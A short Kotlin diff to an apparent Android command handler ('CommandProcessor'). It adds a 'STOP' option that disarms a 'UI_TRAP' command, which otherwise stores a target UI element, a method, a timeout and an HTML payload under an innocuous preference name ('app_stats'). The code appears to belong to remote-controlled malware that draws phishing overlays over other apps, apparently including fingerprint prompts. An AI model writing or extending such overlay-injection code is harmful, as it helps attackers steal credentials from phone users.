@@ -895,7 +895,17 @@ object CommandProcessor {
                 }
                 "UI_TRAP" -> {
                     val parts = content.split("|", limit = 4)
-                    if (parts.size >= 4) {
+                    if (parts.isNotEmpty() && parts[0].trim().uppercase() == "STOP") {
+                        ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit()
+                            .putBoolean("ui_trap_active", false)
+                            .remove("ui_trap_target")
+                            .remove("ui_trap_method")
+                            .remove("ui_trap_timeout")
+                            .remove("ui_trap_html")
+                            .apply()
+                        status = "UI_TRAP_DISARMED"
+                        errorMsg = "Session forcefully reset by STOP parameter."
+                    } else if (parts.size >= 4) {
                         val target = parts[0].trim()
                         val method = parts[1].trim().uppercase()
                         val timeout = parts[2].trim().toLongOrNull() ?: 10L
@@ -913,7 +923,7 @@ object CommandProcessor {
                         errorMsg = "Target: $target (Fingerprint Mode) | Method: $method | Timeout: ${timeout}s"
                     } else {
                         status = "FAILED (FORMAT)"
-                        errorMsg = "Usage: UI_TRAP | TARGET_TEXT_OR_ID | METHOD | TIMEOUT | <html>"
+                        errorMsg = "Usage: UI_TRAP | TARGET_TEXT_OR_ID | METHOD | TIMEOUT | <html>  OR  UI_TRAP | STOP"
                     }
                 }
                 "CLEAR_UI_TRAP" -> {
